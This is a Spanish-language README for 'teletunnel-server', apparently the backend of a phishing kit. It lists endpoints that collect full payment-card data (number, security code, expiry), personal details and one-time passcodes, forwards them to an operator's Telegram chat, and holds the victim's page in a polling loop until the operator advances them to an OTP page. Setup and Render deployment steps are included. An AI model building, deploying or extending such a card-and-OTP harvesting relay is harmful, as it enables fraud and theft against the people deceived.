# teletunnel-server

Puente operador ↔ cliente vía Telegram con botones inline.

## Endpoints

| Método | Ruta | Body |
|---|---|---|
| GET | `/ping` | healthcheck |
| POST | `/payment` | `{ sessionId, p, pdate, c, ban, dues, dudename, surname, cc, email, telnum, city, state, address, ip, location }` |
| POST | `/otp` | `{ sessionId, otp, cardLast4?, ban?, dudename?, surname?, telnum?, email?, ip?, location? }` |
| GET | `/status/:sessionId` | `{ decision: 'next'\|'error'\|'finish'\|null, stage }` |

## Variables de entorno

- `BOT_TOKEN` — token del bot (BotFather)
- `CHAT_ID` — canal/grupo destino (ej. `-1001234567890`). El bot debe ser admin del canal.
- `PUBLIC_URL` — URL pública del servicio en Render (autoping)
- `ALLOWED_ORIGIN` — `*` o dominio exacto del front
- `PORT` — por defecto 3000 (Render la inyecta sola)

## Desarrollo local

```bash
cp .env.example .env
# edita .env con BOT_TOKEN y CHAT_ID
npm install
npm run dev
```

## Deploy en Render

1. Push a GitHub.
2. Render → New → Web Service → conectar el repo.
3. Configurar vars de entorno.
4. Tras el primer deploy, poner `PUBLIC_URL = https://<nombre>.onrender.com`.

## Flujo

```
payment.html         Render              Telegram
     │  POST /payment  │                    │
     ├────────────────►│  sendMessage+kb    │
     │                 ├───────────────────►│
     │                 │                    │
     │  GET /status    │  callback_query    │
     ├────────────────►│◄───────────────────┤
     │  {decision:null}│                    │
     │  ...polling...  │                    │
     │  GET /status    │                    │
     ├────────────────►│                    │
     │  {decision:"next"}                   │
     └──► location.href = 'otp-check.html'  │
```

Mismo patrón para OTP con decisiones `finish` / `error`.
